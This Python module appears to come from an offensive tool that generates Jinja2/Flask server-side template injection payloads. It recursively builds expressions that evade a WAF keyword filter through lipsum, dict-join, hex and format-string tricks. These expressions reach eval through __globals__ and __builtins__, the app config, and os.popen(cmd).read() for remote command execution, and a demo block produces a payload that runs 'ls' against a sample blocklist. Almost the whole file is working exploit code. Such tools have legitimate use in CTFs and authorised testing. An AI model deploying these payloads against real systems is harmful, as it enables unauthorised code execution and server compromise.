from collections import defaultdict
from typing import Callable
import re
import time
import logging
from .colorize import colored


LITERAL = "literal"
UNSATISFIED = "unsatisfied"
ZERO = "zero"
POSITIVE_INTEGER = "positive_integer"
INTEGER = "integer"
STRING_STRING_CONCNAT = "string_string_concat"
STRING_PERCENT = "string_percent"
STRING_PERCENT_LOWER_C = "string_percent_lower_c"
STRING_UNDERLINE = "string_underline"
STRING_LOWERC = "string_lower_c"
STRING_MANY_PERCENT_LOWER_C = "string_many_percent_lower_c"
STRING = "string"
FORMULAR_SUM = "formular_sum"
ATTRIBUTE = "attribute"
ITEM = "item"
CLASS_ATTRIBUTE = "class_attribute"
CHAINED_ATTRIBUTE_ITEM = "chained_attribute_item"
EVAL_FUNC = "eval_func"
EVAL = "eval"
CONFIG = "config"
MODULE_OS = "module_os"
OS_POPEN_OBJ = "os_popen_obj"
OS_POPEN_READ = "os_popen_read"

req_gens = defaultdict(list)
used_count = defaultdict(int)
logger = logging.getLogger("payload_gen")

def req_gen(f):
    gen_type = re.match("gen_([a-z_]+)_([a-z0-9]+)", f.__name__)
    if not gen_type:
        raise Exception(
            f"Error found when register payload generator {f.__name__}")
    req_gens[gen_type.group(1)].append(f)


class PayloadGenerator:
    def __init__(self, waf_func, context):
        self.waf_func = waf_func
        self.context = context
        self.cache = {}
        self.generate_funcs = {
            LITERAL: self.literal_generate,
            UNSATISFIED: self.unsatisfied_generate
        }

    def add_cache(self, gen_type, *args, result=None):
        try:
            # hash() might fail
            if (gen_type, *args) in self.cache:
                return
            self.cache[(gen_type, *args)] = result
        except Exception:
            return

    def count_success(self, gen_type, req_gen_func_name):
        used_count[req_gen_func_name] += 1
        req_gens[gen_type].sort(key = (lambda gen_func: used_count[gen_func.__name__]), reverse=True)

    def generate_by_req_list(self, req_list):
        payload = ""
        for gen_type, *args in req_list:
            result = self.generate(gen_type, *args)
            if not result:
                return None
            payload += result
        return payload

    def literal_generate(self, gen_type, *args):
        return args[0] if self.waf_func(args[0]) else None

    def unsatisfied_generate(self, gen_type, *args):
        return None

    def cached_generate(self, gen_type, *args):
        try:
            # hash() might fail
            if (gen_type, *args) not in self.cache:
                return None
            return self.cache[(gen_type, *args)]
        except Exception:
            return None

    def default_generate(self, gen_type, *args):

        if self.cached_generate(gen_type, *args):
            return self.cached_generate(gen_type, *args)

        if gen_type not in req_gens:
            raise Exception(f"Required type '{gen_type}' not supported.")

        for req_gen_func in req_gens[gen_type].copy():
            son_req = req_gen_func(self.context, *args)

            assert isinstance(
                son_req, list), f"Wrong son_req {son_req} from {req_gen_func.__name__}"
            assert all(isinstance(gen_type, str) for gen_type, *
                       args in son_req), f"Wrong son_req {son_req} from {req_gen_func.__name__}"

            payload = self.generate_by_req_list(son_req)
            if not payload:
                continue
            self.count_success(gen_type, req_gen_func.__name__)
            self.add_cache(gen_type, *args, result=payload)
            if gen_type in (INTEGER, STRING) and payload != str(args[0]):
                logger.info("{great}, {gen_type}({args_repl}) can be {payload}".format(
                    great = colored("green", "Great"),
                    gen_type = colored("yellow", gen_type, bold = True),
                    args_repl = colored("yellow", ", ".join(repr(arg) for arg in args)),
                    payload = colored("blue", payload)
                ))

            elif gen_type in (EVAL_FUNC, EVAL, CONFIG, MODULE_OS, OS_POPEN_OBJ, OS_POPEN_READ):
                logger.info("{great}, we generate {gen_type}({args_repl})".format(
                    great = colored("green", "Great"),
                    gen_type = colored("yellow", gen_type, bold = True),
                    args_repl = colored("yellow", ", ".join(repr(arg) for arg in args)),
                ))
            # logger.warning(f"{log.colored('green', gen_type.upper())} {args_repl} should be {log.colored('blue', payload)}")
            return payload
        logger.warning("{failed} generating {gen_type}({args_repl})".format(
            failed = colored("red", "failed"),
            gen_type = gen_type,
            args_repl = ", ".join(repr(arg) for arg in args),
        ))
        self.add_cache(gen_type, *args, result=None)
        return None

    def generate(self, gen_type, *args):
        generate_func = self.generate_funcs[gen_type] if gen_type in self.generate_funcs else self.default_generate
        return generate_func(gen_type, *args)

def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None) -> str | None:
    payload_generator = PayloadGenerator(waf_func, context)
    return payload_generator.generate(gen_type, *args)

# def generate(gen_type, *args, waf_func: Callable | None = None, context: dict | None = None, cache: dict | None = None) -> str | None:

#     if waf_func is None:
#         raise Exception("waf_func cannot be None")
#     if context is None:
#         context = {}
#     if cache is None:
#         cache = {}

#     if (gen_type, *args) in cache:
#         return cache[(gen_type, *args)]

#     if gen_type == LITERAL:
#         value = args[0]
#         if not waf_func(value):
#             return None
#         return value
#     if gen_type == UNSATISFIED:
#         return None

#     if gen_type not in req_gens:
#         raise Exception(f"gen_type {gen_type} not found")

#     for gen_func in req_gens[gen_type].copy():
#         generated_payload = ""
#         son_req = gen_func(context, *args)
#         assert isinstance(
#             son_req, list), f"Wrong son_req {son_req} from {gen_func.__name__}"
#         assert all(isinstance(req_type, str) for req_type, *
#                    others in son_req), f"Wrong son_req {son_req} from {gen_func.__name__}"
#         for son_type, *son_args in son_req:
#             payload = generate(son_type, *son_args,
#                                waf_func=waf_func, context=context, cache=cache)
#             if payload is None:
#                 generated_payload = None
#                 break
#             generated_payload += payload
#         if generated_payload is not None and waf_func(generated_payload):
#             used_count[gen_func.__name__] += 1
#             req_gens[gen_type].sort(
#                 key=lambda f: used_count[f.__name__], reverse=True)
#             cache[(gen_type, *args)] = generated_payload
#             return generated_payload
#     cache[(gen_type, *args)] = None
#     return None


# ---

@req_gen
def gen_string_string_concat_plus(context: dict):
    return [
        (LITERAL, "+")
    ]


@req_gen
def gen_string_string_concat_wave(context: dict):
    return [
        (LITERAL, "~")
    ]


# ---

@req_gen
def gen_formular_sum_add(context, num_list):
    return [
        (LITERAL, "({})".format("+".join(str(n) for n in num_list)))
    ]


@req_gen
def gen_formular_sum_addfunc(context, num_list):
    num_list = [
        str(n) if i == 0 else ".__add__({})".format(n)
        for i, n in enumerate(num_list)
    ]
    return [
        (LITERAL, "({})".format(
            "".join(num_list)
        ))
    ]


@req_gen
def gen_formular_sum_attraddfund(context, num_list):
    num_list = [
        str(n) if i == 0 else f"|attr(\"\\x5f\\x5fadd\\x5f\\x5f\")({n})"
        for i, n in enumerate(num_list)
    ]
    return [
        (LITERAL, "({})".format(
            "".join(num_list)
        ))
    ]


@req_gen
def gen_formular_sum_tuplesum(context, num_list):
    if len(num_list) == 1:
        return [
            (LITERAL, str(num_list[0]))
        ]
    payload = "(({})|sum)".format(
        ",".join(num_list)
    )
    return [
        (LITERAL, payload)
    ]

# ---


@req_gen
def gen_zero_literal(context: dict):
    return [
        (LITERAL, "0")
    ]


@req_gen
def gen_zero_2(context: dict):
    return [
        (LITERAL, "({}|int)")
    ]


@req_gen
def gen_zero_3(context: dict):
    return [
        (LITERAL, "(g|urlencode|length)")
    ]


@req_gen
def gen_zero_4(context: dict):
    return [
        (LITERAL, "({}|urlencode|count)")
    ]

# ---


@req_gen
def gen_positive_integer_simple(context: dict, value: int):
    if value < 0:
        return [
            (UNSATISFIED, )
        ]
    return [
        (LITERAL, str(value))
    ]


@req_gen
def gen_positive_integer_sum(context: dict, value: int):
    if value < 0:
        return [
            (UNSATISFIED, )
        ]

    ints = [
        (var_name, var_value) for var_name, var_value in context.items()
        if isinstance(var_value, int) and var_value > 0
    ]

    if ints == []:
        return [
            (UNSATISFIED, )
        ]

    ints.sort(key=lambda pair: pair[1], reverse=True)
    value_left = value
    payload_vars = []
    while value_left != 0:
        while ints and ints[0][1] > value_left:
            ints = ints[1:]
        if not ints:
            return [
                (UNSATISFIED, )
            ]
        value_left -= ints[0][1]
        payload_vars.append(ints[0][0])

    return [
        (FORMULAR_SUM, tuple(payload_vars))
    ]

# ---


@req_gen
def gen_integer_literal(context: dict, value: int):
    return [
        (LITERAL, str(value))
    ]


@req_gen
def gen_integer_context(context: dict, value: int):
    if value not in context.values():
        return [
            (UNSATISFIED, )
        ]
    return [
        (LITERAL, [k for k, v in context.items() if v == value][0])
    ]


@req_gen
def gen_integer_zero(context: dict, value: int):
    if value != 0:
        return [
            (UNSATISFIED, )
        ]
    return [
        (ZERO, )
    ]


@req_gen
def gen_integer_positive(context: dict, value: int):
    if value <= 0:
        return [
            (UNSATISFIED, )
        ]
    return [
        (POSITIVE_INTEGER, value)
    ]


@req_gen
def gen_integer_negative(context: dict, value: int):
    if value >= 0:
        return [
            (UNSATISFIED, )
        ]
    return [
        (LITERAL, "-"),
        (POSITIVE_INTEGER, abs(value))
    ]


# @req_gen
# def gen_integer_unicode(context: dict, value: int):
#     dis = ord("０") - ord("0")
#     return [
#         (LITERAL, "".join(chr(ord(c) + dis) for c in str(value)))
#     ]


@req_gen
def gen_integer_subtract(context: dict, value: int):

    ints = [
        (var_name, var_value) for var_name, var_value in context.items()
        if isinstance(var_value, int) and var_value > 0
    ]

    if ints == []:
        return [
            (UNSATISFIED, )
        ]

    ints.sort(key=lambda pair: pair[1], reverse=True)
    bigger = [pair for pair in ints if pair[1] >= value]
    if not bigger:
        return [
            (UNSATISFIED, )
        ]
    to_sub_name, to_sub_value = min(bigger, key=lambda pair: pair[1])
    ints = [pair for pair in ints if pair[1] <= to_sub_value]
    value_left = to_sub_value - value

    sub_vars = []
    while value_left != 0:
        while ints and ints[0][1] > value_left:
            ints = ints[1:]
        if not ints:
            return [
                (UNSATISFIED, )
            ]
        value_left -= ints[0][1]
        sub_vars.append(ints[0][0])
    return [
        (LITERAL, "({})".format("-".join([to_sub_name, ] + sub_vars)))
    ]


# ---

@req_gen
def gen_string_percent_literal1(context):
    return [
        (LITERAL, "'%'")
    ]


@req_gen
def gen_string_percent_literal2(context):
    return [
        (LITERAL, '"%"')
    ]


@req_gen
def gen_string_percent_context(context):
    if "%" not in context.values():
        return [
            (UNSATISFIED, )
        ]

    return [
        (LITERAL, [k for k, v in context.items() if v == "%"][0])
    ]


@req_gen
def gen_string_percent_urlencode1(context):
    return [
        (LITERAL, "(lipsum()|urlencode|first)")
    ]


@req_gen
def gen_string_percent_urlencode2(context):
    return [
        (LITERAL, "({}|escape|urlencode|first)")
    ]


@req_gen
def gen_string_percent_lipsum(context):
    return [
        (LITERAL, "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2" +
         "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]" +
         "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)" +
         "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))")
    ]


@req_gen
def gen_string_percent_lipsumcomplex(context):
    return [
        (LITERAL, "(lipsum[(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(globals=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "+dict(builtins=x)|join+(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)*"),
        (INTEGER, 2),
        (LITERAL, "][dict(chr=x)|join]("),
        (INTEGER, 37),
        (LITERAL, "))"),
    ]

# ---


@req_gen
def gen_string_lower_c_literal1(context):
    return [
        (LITERAL, "'c'")
    ]


@req_gen
def gen_string_lower_c_literal2(context):
    return [
        (LITERAL, '"c"')
    ]


@req_gen
def gen_string_lower_c_joindict(context):
    return [
        (LITERAL, '(dict(c=x)|join)')
    ]


@req_gen
def gen_string_lower_c_lipsumurlencode(context):
    return [
        (LITERAL, "(lipsum|pprint|first|urlencode|last|lower)")
    ]


@req_gen
def gen_string_lower_c_lipsumbatch(context):
    return [
        (LITERAL, "(lipsum|escape|batch("),
        (INTEGER, 8),
        (LITERAL, ")|first|last)")
    ]


@req_gen
def gen_string_lower_c_joinerbatch(context):
    return [
        (LITERAL, "(joiner|string|batch("),
        (INTEGER, 2),
        (LITERAL, ")|first|last)")
    ]

# ---


@req_gen
def gen_string_percent_lower_c_literal1(context):
    return [
        (LITERAL, "'%c'")
    ]


@req_gen
def gen_string_percent_lower_c_literal2(context):
    return [
        (LITERAL, '"%c"')
    ]


@req_gen
def gen_string_percent_lower_c_concat(context):
    return [
        (LITERAL, "("),
        (STRING_PERCENT, ),
        (STRING_STRING_CONCNAT, ),
        (STRING_LOWERC, ),
        (LITERAL, ")"),
    ]


@req_gen
def gen_string_percent_lower_c_cycler(context):
    # cycler|pprint|list|pprint|urlencode|batch(%s)|first|join|batch(%s)|list|last|reverse|join|lower
    return [
        (LITERAL, "(cycler|pprint|list|pprint|urlencode|batch("),
        (INTEGER, 10),
        (LITERAL, ")|first|join|batch("),
        (INTEGER, 8),
        (LITERAL, ")|list|last|reverse|join|lower)")
    ]

# ---


@req_gen
def gen_string_many_percent_lower_c_multiply(context, count: int):
    return [
        (STRING_PERCENT_LOWER_C, ),
        (LITERAL, "*"),
        (INTEGER, count)
    ]


@req_gen
def gen_string_many_percent_lower_c_concat(context, count: int):

    l = [
        [(STRING_PERCENT_LOWER_C, ), ] if i == 0 else [
            (STRING_STRING_CONCNAT, ), (STRING_PERCENT_LOWER_C, ), ]
        for i in range(count)
    ]
    return [item for lst in l for item in lst]


# ---

@req_gen
def gen_string_underline_literal1(context):
    return [
        (LITERAL, "'_'")
    ]


@req_gen
def gen_string_underline_literal2(context):
    return [
        (LITERAL, '"_"')
    ]


@req_gen
def gen_string_underline_context(context: dict):
    if "_" in context.values():
        return [
            (LITERAL, [k for k, v in context.items() if v == "_"][0])
        ]
    return [
        (UNSATISFIED, )
    ]


@req_gen
def gen_string_underline_lipsum(context):
    return [
        (LITERAL, "(lipsum|escape|batch("),
        (INTEGER, 22),
        (LITERAL, ")|list|first|last)")
    ]


@req_gen
def gen_string_underline_tupleselect(context):
    return [
        (LITERAL, "(()|select|string|batch("),
        (INTEGER, 25),
        (LITERAL, ")|first|last)")
    ]


# ---
# 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用

@req_gen
def gen_string_1(context: dict, value: str):
    chars = [c if c != "\'" else "\\\'" for c in value]
    return [
        (LITERAL, "'{}'".format("".join(chars)))
    ]


@req_gen
def gen_string_2(context: dict, value: str):
    chars = [c if c != "\"" else "\\\"" for c in value]
    return [
        (LITERAL, '"{}"'.format("".join(chars)))
    ]


@req_gen
def gen_string_x1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [
            (UNSATISFIED, )
        ]
    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
    return [
        (LITERAL, '"{}"'.format(target))
    ]


@req_gen
def gen_string_x2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [
            (UNSATISFIED, )
        ]
    target = "".join("\\x" + hex(ord(c))[2:] for c in value)
    return [
        (LITERAL, "'{}'".format(target))
    ]


@req_gen
def gen_string_u1(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [
            (UNSATISFIED, )
        ]
    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
    return [
        (LITERAL, "'{}'".format(target))
    ]


@req_gen
def gen_string_u2(context: dict, value: str):
    if any(ord(c) >= 128 for c in value):
        return [
            (UNSATISFIED, )
        ]
    target = "".join("\\u00" + hex(ord(c))[2:] for c in value)
    return [
        (LITERAL, "'{}'".format(target))
    ]


@req_gen
def gen_string_context(context: dict, value: str):
    if value not in context.values():
        return [
            (UNSATISFIED, )
        ]
    return [
        (LITERAL, [k for k, v in context.items() if v == value][0])
    ]


@req_gen
def gen_string_removedunder(context: dict, value: str):
    if not re.match("^__[A_Za-z0-9_]+__$", value):
        return [
            (UNSATISFIED, )
        ]
    return [
        (STRING_UNDERLINE, ),
        (LITERAL, "*"),
        (INTEGER, 2),
        (STRING_STRING_CONCNAT, ),
        (STRING, value[2:-2]),
        (STRING_STRING_CONCNAT, ),
        (STRING_UNDERLINE, ),
        (LITERAL, "*"),
        (INTEGER, 2),
    ]


@req_gen
def gen_string_concat1(context: dict, value: str):
    return [
        (LITERAL, "({})".format(
            "+".join("'{}'".format(c if c != "'" else "\\'") for c in value)
        ))
    ]


@req_gen
def gen_string_concat2(context: dict, value: str):
    return [
        (LITERAL, "({})".format(
            "+".join('"{}"'.format(c if c != '"' else '\\"') for c in value)
        ))
    ]


@req_gen
def gen_string_dictjoin(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [
            (UNSATISFIED, )
        ]
    return [
        (LITERAL, "(dict({}=x)|join)".format(value))
    ]


@req_gen
def gen_string_splitdictjoin(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [
            (UNSATISFIED, )
        ]
    parts = [
        value[i:i+3] for i in range(0, len(value), 3)
    ]
    req = []
    for i, part in enumerate(parts):
        if i != 0:
            req.append((STRING_STRING_CONCNAT, ))
        req.append((LITERAL, "(dict({}=x)|join)".format(part)))
    return req


@req_gen
def gen_string_splitdictjoin2(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [
            (UNSATISFIED, )
        ]
    parts = [
        value[i:i+3] for i in range(0, len(value), 3)
    ]

    if len(set(parts)) != len(parts):
        return [
            (UNSATISFIED, )
        ]

    return [
        (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in parts)))
    ]


@req_gen
def gen_string_splitdictjoin3(context: dict, value: str):
    if not re.match("^[a-zA-Z_]+$", value):
        return [
            (UNSATISFIED, )
        ]

    if len(set(value)) != len(value):
        return [
            (UNSATISFIED, )
        ]

    return [
        (LITERAL, "(dict({})|join)".format(",".join(f"{part}=x" for part in value)))
    ]


@req_gen
def gen_string_formatpercent(context: dict, value: str):
    # (('%c'*n)%(97,98,99))
    req = []
    req.append(
        (LITERAL, "((")
    )
    req.append(
        (STRING_MANY_PERCENT_LOWER_C, len(value))
    )
    req.append(
        (LITERAL, ")%(")
    )
    for i, c in enumerate(value):
        if i != 0:
            req.append((LITERAL, ","))
        req.append((INTEGER, ord(c)))
    req.append(
        (LITERAL, "))")
    )
    return req


@req_gen
def gen_string_formatfunc(context: dict, value: str):
    # (('%c'*n)|format(97,98,99))
    req = []
    req.append(
        (LITERAL, "((")
    )
    req.append(
        (STRING_MANY_PERCENT_LOWER_C, len(value))
    )
    req.append(
        (LITERAL, ")|format(")
    )
    for i, c in enumerate(value):
        if i != 0:
            req.append((LITERAL, ","))
        req.append((INTEGER, ord(c)))
    req.append(
        (LITERAL, "))")
    )
    return req

# ---


@req_gen
def gen_attribute_normal1(context, obj_req, attr_name):
    if not re.match("[A-Za-z_][A-Za-z0-9_]+", attr_name):
        return [
            (UNSATISFIED, )
        ]
    return [
        (LITERAL, "("),
        obj_req,
        (LITERAL, "."),
        (LITERAL, attr_name),
        (LITERAL, ")"),
    ]


@req_gen
def gen_attribute_normal2(context, obj_req, attr_name):
    return [
        (LITERAL, "("),
        obj_req,
        (LITERAL, "["),
        (STRING, attr_name),
        (LITERAL, "])"),
    ]


@req_gen
def gen_attribute_attrfilter(context, obj_req, attr_name):
    return [
        (LITERAL, "("),
        obj_req,
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, "))"),
    ]

# ---


@req_gen
def gen_item_normal1(context, obj_req, item_name):
    if not re.match("[A-Za-z_][A-Za-z0-9_]+", item_name):
        return [
            (UNSATISFIED, )
        ]
    return [
        (LITERAL, "("),
        obj_req,
        (LITERAL, "."),
        (LITERAL, item_name),
        (LITERAL, ")"),
    ]


@req_gen
def gen_item_normal2(context, obj_req, item_name):
    return [
        (LITERAL, "("),
        obj_req,
        (LITERAL, "["),
        (STRING, item_name),
        (LITERAL, "])"),
    ]


@req_gen
def gen_item_dunderfunc(context, obj_req, item_name):
    return [
        (LITERAL, "("),
        (ATTRIBUTE, obj_req, "__getitem__"),
        (LITERAL, "("),
        (STRING, item_name),
        (LITERAL, "))"),
    ]

# ---


@req_gen
def gen_class_attribute_literal(context, obj_req, attr_name):
    # obj.__class__.attr
    return [
        (
            ATTRIBUTE,
            obj_req,
            "__class__",
        ),
        (LITERAL, "." + attr_name)
    ]


@req_gen
def gen_class_attribute_attrfilter(context, obj_req, attr_name):
    # obj.__class__.attr
    return [
        (LITERAL, "("),
        (
            ATTRIBUTE,
            obj_req,
            "__class__",
        ),
        (LITERAL, "|attr("),
        (STRING, attr_name),
        (LITERAL, "))"),
    ]
# ---


@req_gen
def gen_chained_attribute_item_normal(context, obj_req, *attr_item_req):
    if not attr_item_req:
        return [obj_req,]
    first_req, *other_req = attr_item_req
    req_type, req_name = first_req
    got_req = (
        req_type,
        obj_req,
        req_name,
    )
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            got_req,
            *other_req,
        ),
    ]

# ---


# ---


@req_gen
def gen_eval_func_lipsum(context):
    return [(
        CHAINED_ATTRIBUTE_ITEM,
        (LITERAL, "lipsum"),
        (ATTRIBUTE, "__globals__"),
        (ITEM, "__builtins__"),
        (ITEM, "eval")
    )]


@req_gen
def gen_eval_func_joiner(context):
    return [(
        CHAINED_ATTRIBUTE_ITEM,
        (LITERAL, "joiner"),
        (ATTRIBUTE, "__init__"),
        (ATTRIBUTE, "__globals__"),
        (ITEM, "__builtins__"),
        (ITEM, "eval")
    )]

# @req_gen
# def gen_eval_func_x(context):
#     return [(
#         CHAINED_ATTRIBUTE_ITEM,
#         (LITERAL, "x"),
#         (ATTRIBUTE, "__init__"),
#         (ATTRIBUTE, "__globals__"),
#         (ITEM, "__builtins__"),
#         (ITEM, "eval")
#     )]

# ---


@req_gen
def gen_eval_normal(context, code):
    return [
        (LITERAL, "("),
        (EVAL_FUNC, ),
        (LITERAL, "("),
        (STRING, code),
        (LITERAL, "))")
    ]

# ---


@req_gen
def gen_config_literal(context):
    return [
        (LITERAL, "config")
    ]


@req_gen
def gen_config_self(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "self"),
            (ATTRIBUTE, "__dict__"),
            (ITEM, "_TemplateReference__context"),
            (ITEM, "config"),
        )
    ]


@req_gen
def gen_config_request(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "request"),
            (ATTRIBUTE, "application"),
            (ATTRIBUTE, "__self__"),
            (ATTRIBUTE, "json_module"),
            (ATTRIBUTE, "JSONEncoder"),
            (ATTRIBUTE, "default"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "current_app"),
            (ATTRIBUTE, "config"),
        )
    ]

# ---


@req_gen
def gen_module_os_urlfor(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (LITERAL, "url_for"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os")
        )
    ]


@req_gen
def gen_module_os_config(context):
    return [
        (
            CHAINED_ATTRIBUTE_ITEM,
            (CONFIG, ),
            (CLASS_ATTRIBUTE, "__init__"),
            (ATTRIBUTE, "__globals__"),
            (ITEM, "os"),
        )
    ]

# ---


@req_gen
def gen_os_popen_obj_eval(context, cmd):
    cmd = cmd.replace("'", "\\'")
    return [
        (EVAL, "__import__('os').popen('" + cmd + "')")
    ]


@req_gen
def gen_os_popen_obj_normal(context, cmd):
    return [
        (LITERAL, "("),
        (
            ATTRIBUTE,
            (MODULE_OS, ),
            "popen"
        ),
        (LITERAL, "("),
        (STRING, cmd),
        (LITERAL, "))"),
    ]


# ---


@req_gen
def gen_os_popen_read_normal(context, cmd):
    return [
        (LITERAL, "("),
        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
        (LITERAL, "())"),
    ]


if __name__ == "__main__":
    import time
    import functools

    @functools.lru_cache(100)
    def waf_func(payload: str):
        time.sleep(0.2)
        # print(payload)
        return all(word not in payload for word in ['\'', '"', '.', '_', 'import', 'request', 'url', '\\x', 'os', 'system', '\\u', '22'])

    payload = generate(
        OS_POPEN_READ,
        "ls",
        waf_func=waf_func,
        context={"loo": 100, "lo": 10, "l": 1, "un": "_"}
    )
    print(payload)
